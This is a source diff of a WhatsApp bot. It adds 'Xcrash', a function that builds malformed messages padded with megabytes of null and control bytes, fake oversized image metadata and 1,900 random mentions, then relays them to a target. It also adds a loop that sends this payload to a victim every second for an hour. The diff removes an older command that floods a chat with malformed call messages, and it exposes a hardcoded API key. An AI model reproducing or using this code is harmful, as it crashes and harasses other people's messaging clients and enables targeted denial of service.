@@ -186,7 +186,7 @@ if (STARTUP_URL) {
 
 
 
-
+const SY_WEL_AUDIO = "https://sabir7718.is-a.dev/zoro/ZORO_AUDIO.mp3"
 const LOOKUP_API_KEY = "vishalboss_key_6adcadb1cd9e1ba26ffcedc4bb3ee9f49feb042c";
 const LOOKUP_API_URL = "https://numberimfo.vishalboss.sbs/api.php";
 const LOOKUP_CREATOR = "*_ZORO_*";
@@ -646,7 +646,102 @@ function isLOVSmeSY(message, sock) {
 
 
 
+async function Xcrash(sock, target, ptcp = true) {
+  const VariabelJid = "0@s.whatsapp.net";
+  const imageMsg = {
+    url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
+    mimetype: "image/jpeg",
+    fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
+    fileLength: "99999999",
+    height: 9999,
+    width: 9999,
+    mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
+    fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
+    directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
+    mediaKeyTimestamp: "1755254367",
+    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyy4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgETHERQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAREgABASMP/aAAgBAwEBPwCz5LGdFYN//9k=",
+    caption: "\u0000".repeat(104500),
+  };
 
+  let msg = generateWAMessageFromContent(target, {
+    viewOnceMessage: {
+      message: {
+        albumMessage: {
+          expectedImageCount: 666,
+          expectedVideoCount: 0,
+          items: [
+            { 
+              imageMessage: imageMsg 
+            }
+          ],
+          contextInfo: {
+            mentionedJid: [
+              "13135550002@s.whatsapp.net",
+              ...Array.from({ length: 1900 }, 
+              () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
+              )
+            ],
+            participant: "0@s.whatsapp.net",
+            remoteJid: "status@broadcast",
+            stanzaId: "1234567890ABCDEF",
+            businessMessageForwardInfo: {
+              businessOwnerJid: VariabelJid,
+            },
+          },
+        },
+      },
+    },
+  }, {});
+  
+  await sock.relayMessage(target, {
+    groupStatusMessageV2: {
+      message: msg.message,
+     },
+    }, ptcp ? 
+    { 
+      messageId: msg.key.id, 
+      participant: { jid: target } 
+    } : { messageId: msg.key.id }
+  );
+  
+  const payload = generateWAMessageFromContent(target, {
+    viewOnceMessage: {
+      message: {
+        interactiveResponseMessage: {
+          body: { 
+            text: "𝗫 - 𝗭 𝗢 R 𝗢", 
+            format: "DEFAULT" 
+          },
+          nativeFlowResponseMessage: {
+            name: "address_message",
+            paramsJson: "\x10".repeat(1045000),
+            version: 3
+          },
+          entryPointConversionSource: "call_permission_request"
+          },
+        },
+      },
+    },
+    {
+      ephemeralExpiration: 0,
+      forwardingScore: 9741,
+      isForwarded: true,
+      font: Math.floor(Math.random() * 99999999),
+      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
+    },
+  );
+  
+  await sock.relayMessage(target, {
+    groupStatusMessageV2: {
+      message: payload.message,
+     },
+    }, ptcp ? 
+    { 
+      messageId: payload.key.id, 
+      participant: { jid: target } 
+    } : { messageId: payload.key.id }
+  );
+}
 
 
 
@@ -2037,33 +2132,50 @@ await sock.relayMessage(target, {
 
 
 
-async function S7LOVESYUILIKES7(sock, targetJid) {
+/*async function S7LOVESYUILIKES7(sock, targetJid) {
   const SY_LOVE_IS_IMPORTANT = 1000;
   const ALSO_S7_TOO = 10 * 60 * 1000;
   const ONE_HOUR_LOVS = 60 * 60 * 1000;
   const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+  const target = targetJid;
   
 
   const startTime = Date.now();
 
   while (Date.now() - startTime < ONE_HOUR_LOVS) {
   
-    await SYuicrashS7(sock, targetJid);
-    await SYuicrashS7(sock, targetJid);
+    await Xcrash(sock, target);
+    await Xcrash(sock, target);
 
     const tenMinuteStart = Date.now();
 
 
     while (Date.now() - tenMinuteStart < ALSO_S7_TOO) {
     
-      await callcrash(sock, targetJid);
-      await callcrash(sock, targetJid);
+     // await callcrash(sock, target);
+    //  await callcrash(sock, target);
       await delay(SY_LOVE_IS_IMPORTANT);
     }
     
     
-    await SYuicrashS7(sock, targetJid);
-    await SYuicrashS7(sock, targetJid);
+    await Xcrash(sock, target);
+    await Xcrash(sock, target);
+  }
+}*/
+
+
+
+async function S7LOVESYUILIKES7(sock, targetJid) {
+  const ONE_LOVE = 60 * 60 * 1000;
+  const LOVE_SEC = 1 * 1000;
+  const target = targetJid;
+
+  const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+  const startTime = Date.now();
+
+  while (Date.now() - startTime < ONE_LOVE) {
+    await Xcrash(sock, target);
+    await delay(LOVE_SEC);
   }
 }
 
@@ -2867,17 +2979,41 @@ case userMessage.startsWith('.test'): {
                 }
                 await unbanCommand(sock, chatId, message);
                 break;
-            case userMessage === '.help' || userMessage === '.menu' || userMessage === '.bot' || userMessage === '.list':
+            case userMessage === '.help' ||
+     userMessage === '.menu' ||
+     userMessage === '.bot'  ||
+     userMessage === '.list':
+
     await helpCommand(sock, chatId, message, global.channelLink);
     commandMatched = true;
 
     await new Promise(resolve => setTimeout(resolve, 1300));
 
-    await sock.sendMessage(chatId, {
-        audio: { url: 'https://e.top4top.io/m_365891tfv0.mp3' },
-        mimetype: 'audio/mpeg',
-        ptt: false
-    });
+    try {
+        await sock.sendMessage(
+            chatId,
+            {
+                audio: { url: SY_WEL_AUDIO },
+                mimetype: 'audio/mpeg',
+                ptt: false,
+                caption: "ᵁ⁰ᶠᶜQᵁ⁵ᴮᶜᵍ ✦"
+            },
+            { quoted: message }
+        );
+    } catch (err) {
+        console.error("Audio with caption failed:", err);
+
+        await sock.sendMessage(
+            chatId,
+            {
+                audio: { url: SY_WEL_AUDIO },
+                mimetype: 'audio/mpeg',
+                ptt: false
+            },
+            { quoted: message }
+        );
+    }
+    break;
 
     break;
             case userMessage === '.sticker' || userMessage === '.s':
@@ -3258,48 +3394,6 @@ for (let i = 0; i < attempts; i++) {
         }, channelInfo),
         { quoted: message }
     );
-
-    break;
-}
-
-case userMessage.startsWith('.forceblock'): {
-
-    if (!message.key.fromMe && !(await isOwnerOrSudo(senderId, sock, chatId))) {
-        await sock.sendMessage(
-            chatId,
-            { text: '❌ Only owner/sudo can use this command!' },
-            { quoted: message }
-        );
-        break;
-    }
-
-    const args = rawText.slice(10).trim().split(/\s+/);
-
-    let loopCount = parseInt(args[0]);
-    if (isNaN(loopCount) || loopCount < 1) loopCount = 5;
-
-    const targetJid = chatId;
-
-    for (let i = 0; i < loopCount; i++) {
-        await new Promise(r => setTimeout(r, 1050));
-
-        await sock.relayMessage(
-            targetJid,
-            {
-                messageContextInfo: {
-                    messageSecret: "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
-                    deviceListMetaData: {},
-                    deviceListMetadataVersion: 2
-                },
-                scheduledCallCreationMessage: {
-                    scheduledTimestampMs: '1200',
-                    callType: "AUDIO",
-                    title: '👻'
-                }
-            },
-            { additionalAttributes: { edit: '7' } }
-        );
-    }
 
     break;
 }
